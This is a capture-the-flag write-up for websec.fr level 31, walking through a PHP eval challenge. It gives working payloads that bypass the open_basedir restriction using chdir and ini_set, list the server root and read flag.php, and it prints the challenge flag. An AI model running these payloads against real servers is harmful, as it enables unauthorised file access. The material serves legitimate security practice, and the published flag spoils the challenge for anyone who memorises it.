# Level 31

1. First, lets check what is written in https://websec.fr/level31/source.php
2. It seems that it is an easy question but not of course. In fact, I even can't figure out how to break in, before reading lots of repo.
3. The first step I do is google what is "[eval](https://www.php.net/manual/en/function.eval.php)" in php and we can find out that it is a really "interesting" code.
4. So, I type the command 
    ```
    phpinfo();
    ```
    to the payload and find out lots of information. For example, we can't type some command such as "system()" in it cuz the command is in "disable_functions". 
5. After a long time searching for things I need, I find an interesting directive "[open_basedir](https://www.php.net/manual/en/ini.core.php#ini.open-basedir)", which is next to "/sandbox", and here is the sad thing that there is no value in the direction sandbox.
6. So, we have to get files before sandbox to get some information. Of course, I have no idea how to do it. Then, I google "open_basedir ctf" and get the keywords "[open_basedir bypass](https://twitter.com/eboda_/status/1113839230608797696)". 
7. Ok! Here is the main problem --- how it works. First, we have to know what "[ini_set](https://www.php.net/manual/zh/function.ini-set.php)" works. After we know that, the next step is why we have to change into a sub-directory. It is because we are not able to change the direction since we are under "open_basedir", so we have to switch to another place and then go back to get some informations. By the way, we cannot use the command "mkdir" to new a direction. You can try it and you will see why.
8. Since we cannot use "mkdir", we have to find a sub-directory that we can switch. Then, I wondering for a long time search for some commom directory structure on linux, cuz the website's system info is 
    ```
    Linux yzma 4.19.0-6-amd64 #1 SMP Debian 4.19.67-2+deb10u1 (2019-09-20) x86_64
    ```
    Then, I found the [website](https://www.howtogeek.com/117435/htg-explains-the-linux-directory-structure-explained/) and write a script by python to find out which one is available. After the script is finished, "./tmp" is available.
9. So, let me explain what is going on and why I do that. The main goal I want to do is to bypass the "open_basedir" which is a limit. Then, I use "ini_set()" to set the value of "open_basedir" and use "chdir('..')" to move. It will look like this
    ```
    /sandbox/tmp    (relative path)
    
    /sandbox        (real path)
    ```
    become
    ```
    /sandbox        (relative path)
    
    /               (real path)
    ```
    As you can see, we bypass the limit of the "open_basedir".
10. Now, we have to find out the list of the root. Here is the payload I use : 
    ```
    chdir('./tmp');  ini_set('open_basedir','..'); chdir('..');  ini_set('open_basedir','/');  var_dump(scandir('/'));
    ```
    And the result : 
    ```
    array(7) { [0]=> string(1) "." [1]=> string(2) ".." [2]=> string(8) "flag.php" [3]=> string(9) "index.php" [4]=> string(12) "php-fpm.sock" [5]=> string(7) "sandbox" [6]=> string(10) "source.php" }
    ```
    Here it is! So, we have to read the file "flag.php" with the command "file_get_contents()". Here is the payload I use : 
    ```
    chdir('./tmp');  ini_set('open_basedir','..'); chdir('..');  ini_set('open_basedir','/');  var_dump(file_get_contents('/flag.php'));
    ```
    Don't be shock that there is no flag but "string(89) "" on the web. You are able to find it if you open the source code. 
11. Here is the flag : WEBSEC{Cheers_to_Blaklis_for_his_phuck3_challenge_for_Insomnihack_2019}
